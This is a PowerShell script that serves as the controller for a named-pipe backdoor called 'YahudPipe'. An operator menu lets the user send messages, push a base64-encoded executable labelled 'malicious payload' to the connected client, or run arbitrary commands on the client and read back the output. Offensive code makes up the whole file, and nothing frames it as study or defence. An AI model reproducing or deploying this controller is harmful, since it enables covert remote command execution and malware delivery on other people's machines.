﻿function ReadMsg([System.IO.StreamReader]$StreamReader){
    $msg = $StreamReader.ReadLine()
    Write-Host $msg
}

try{
    $pipeName = "YahudPipe";
    $pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName); # Creation new pipe object
    Write-Host "Listening on \\.pipe\$pipeName";
    $pipeServer.WaitForConnection();
    $sr = New-Object System.IO.StreamReader($pipeServer) # StreamReader read text from a file, from $pipe here
    $sw = New-Object System.IO.StreamWriter($pipeServer)
    $user = $sr.ReadLine()
    Write-Host "Connection Established... from", $user

    $sw.AutoFlush=$true

    while ($pipeServer.IsConnected){
        $action = Read-Host "What action do you want to do ?  
        1. Send message to client
        2. Run Malicious code
        3. Run Command
        4. Quit
"
        
        if ($action -eq 1){
            $sw.WriteLine("action=1")
            while($msg -ne "stop"){
                $msg = Read-Host "Enter your message to send"
                $sw.WriteLine($msg)
            }
        }
        elseif ($action -eq 2){
            $sw.WriteLine("action=2")
            Write-Host "Uploading malicious payload to client"
            $assemblyPath = 'D:\Programming\C#\YahudScript\Malcode\Malcode.exe'
            $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
            $assemblyString = [System.Convert]::ToBase64String($assemblyByte)
            $sw.WriteLine($assemblyString) # Server sending to the client

        }
        elseif ($action -eq 3){
            $sw.WriteLine("action=3")
            Write-Host "Sending commands to client"
            $command = Read-Host "Run command : "
            $sw.WriteLine($command)

            # Receive command result lenght from the client
            $lenght = [int]$sr.ReadLine()

            #Output the command result
            for($cpt = 0; $cpt -lt $lenght; $cpt++){
                $result = $sr.ReadLine()
                Write-Host $result
            }


        }
        elseif ($action -eq 4){
            $sw.WriteLine("action=4")
            $sw.Dispose()
            $pipeServer.Dispose()
        }
    }
    $sw.Dispose()
    $pipeServer.Dispose()

}

catch{
    Write-Host "Failed to create the pipe $pipeName"
    return 0;
}